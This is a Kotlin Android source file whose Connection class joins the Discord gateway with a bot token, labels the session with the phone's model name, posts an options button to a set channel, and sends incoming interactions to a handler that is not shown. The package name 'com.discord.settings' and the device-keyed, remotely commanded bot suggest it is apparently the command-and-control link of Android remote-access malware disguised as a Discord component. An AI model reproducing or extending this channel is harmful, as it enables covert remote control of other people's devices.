package com.discord.settings

import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject

class Connection(val context: Context){
    private var token = "<BOT_TOKEN_HERE>"//Discord Bot Token
    private var channelId = "<CHANNEL_ID_HERE>" //Discord Server > channel id
    private val client: OkHttpClient by lazy {OkHttpClient() }//okhttp (websocket) initialization
    private lateinit var webSocket: WebSocket
    private val heartbeatInterval = 25000L //interval for heartbeat to run
    private var myId:Long = 0 //my bot id
    val myModel =  Build.MODEL.replace(" ","").lowercase() //my device model
    private val logEventName:String = "DiscordConnection" //log name
    var isConnected:Boolean=false

    //run heartbeat (to maintain websocket connection) every 25 seconds
    private fun startHeartbeat(webSocket: WebSocket) {
        // Create a handler to run the heartbeat periodically
        val handler = Handler(Looper.getMainLooper())
        val heartbeatRunnable = object : Runnable {
            override fun run() {
                // Send heartbeat message
                val heartbeatJson = """{"op": 1, "d": null}""" // This is the basic Discord heartbeat
                webSocket.send(heartbeatJson)
                Log.d(logEventName, "startHeartbeat : Starting heartBeat")

                // Schedule next heartbeat
                handler.postDelayed(this, heartbeatInterval)
            }
        }
        // Start the first heartbeat
        handler.post(heartbeatRunnable)
    }

    private fun identifyPayload(token: String): String {
        return """{
            "op": 2,
            "d": {
                "token": "$token",
                "intents": 33280,
                "properties": {
                    "os": "linux",
                    "browser": "node",
                    "device": "node"
                }
            }
        }"""
    }

    fun run(context:Context,event:String="normal") {
        val request = Request.Builder()
            .url("wss://gateway.discord.gg/?v=10&encoding=json")
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {

                Log.d(logEventName, " run : Connected to Discord Gateway")
                val identifyPayload = identifyPayload(token)
                webSocket.send(identifyPayload)
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected=false
                Log.d(logEventName, "run : Error: ${t.message} verbose : $t")
            }
            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(logEventName, "run : Disconnected from Discord Gateway: $code - $reason")
            }
            override fun onMessage(webSocket: WebSocket, text: String) {

                var sendMessageModel= SendMessageModel(token,channelId,client,myModel)

                // Your message handling logic
                val jsonObject = JSONObject(text)
                val type = jsonObject.getString("t")

                if(type == "READY"){
                    val d = jsonObject.getJSONObject("d")
                    val user =d.getJSONObject("user")
                    myId = user.getLong("id")
                    startHeartbeat(webSocket) //start heart beat
                    sendMessageModel = SendMessageModel(token,channelId,client,myModel)
                    sendMessageModel.sendOptionsButton(event)
                    isConnected=true
                }
                else if(type =="INTERACTION_CREATE"){
                    ProcessInteractionsAndMessages(myModel,sendMessageModel).processInteractions(jsonObject,context)

                }
                else if(type =="MESSAGE_CREATE"){
                    val d = jsonObject.getJSONObject("d")
                    //val messageId= d.getLong("id")
                    val author = d.getJSONObject("author")
                    val authorId = author.getLong("id")
                    val content = d.getString("content").lowercase().replace("\\s+".toRegex(), " ").trim()
                    if(authorId!=myId && content!=""){
                        if(content=="ping"){
                            sendMessageModel.sendOptionsButton("")
                        }
                    }
                }

            }
        })
    }




}